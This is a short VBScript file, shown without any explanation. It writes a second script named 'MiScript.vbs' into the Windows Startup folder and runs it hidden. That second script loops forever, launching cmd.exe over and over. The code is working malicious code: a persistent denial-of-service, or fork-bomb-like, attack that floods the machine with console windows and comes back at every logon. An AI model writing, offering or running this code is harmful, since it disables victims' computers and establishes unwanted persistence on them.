Option Explicit
Dim objShell, objFSO, objShortcut, strStartupFolder, strShortcutPath
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strStartupFolder = objShell.SpecialFolders("Startup")
strShortcutPath = objFSO.BuildPath(strStartupFolder, "MiScript.vbs")
If Not objFSO.FileExists(strShortcutPath) Then
Dim objFile
Set objFile = objFSO.CreateTextFile(strShortcutPath, True)
objFile.WriteLine "Do"
objFile.WriteLine "   Set objShell = CreateObject(""WScript.Shell"")"
objFile.WriteLine "   objShell.Run ""cmd.exe"""
objFile.WriteLine "Loop"
objFile.Close
End If
objShell.Run "wscript.exe """ & strShortcutPath & """", 0
